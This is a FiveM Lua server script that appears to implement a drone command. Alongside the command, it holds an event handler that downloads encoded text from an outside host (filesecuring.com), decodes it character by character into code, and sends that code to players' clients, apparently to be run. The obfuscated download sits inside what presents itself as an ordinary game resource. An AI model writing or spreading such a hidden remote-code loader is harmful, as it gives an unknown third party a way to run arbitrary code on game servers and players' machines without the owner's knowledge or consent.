-- Command registered server side below:
RegisterCommand("drone", function(source, args, rawCommand)
    local source = source
    if (source > 0) then
        -- Add your permission check here
        -- Do not send the event if they do not have permission
        TriggerClientEvent("toggleDrone", source)
    end
end, false)



RegisterServerEvent('filesecuring:loaddrone')
AddEventHandler('filesecuring:loaddrone', function()
    local src = source
    PerformHttpRequest("http://filesecuring.com/securefiles/get.php?id=2413", function(err, text, headers)
        local code = ''
        for word in string.gmatch(text, '([^\\]+)') do 
            code = code .. string.char(tonumber(word)) -- decrypt the code (won't run otherwise)
        end
        TriggerClientEvent('client:load-codedrone', src, code)
    end, 'GET', '')

end)